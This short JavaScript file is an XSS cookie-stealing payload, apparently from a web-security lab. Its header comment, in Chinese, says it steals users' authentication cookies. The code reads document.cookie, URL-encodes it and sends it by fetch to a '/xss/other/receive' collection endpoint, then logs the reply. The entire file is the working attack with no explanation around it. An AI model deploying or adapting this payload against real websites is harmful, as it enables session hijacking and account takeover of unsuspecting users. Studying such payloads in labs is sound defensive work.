/**
 * @description 用来盗取用户认证cookie信息
 * @author:  whgojp
 * @email:  whgojp@foxmail.com
 * @Date: 2024/6/29 17:34
 */

var url = '/xss/other/receive?cookie='+encodeURIComponent(document.cookie);
var params = {
    method: 'GET',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
};

fetch(url, params)
    .then(function(response) {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(function(data) {
        // 请求成功处理
        console.log(data);
    })
    .catch(function(error) {
        // 请求失败处理
        console.error('Fetch Error: ', error);
    });
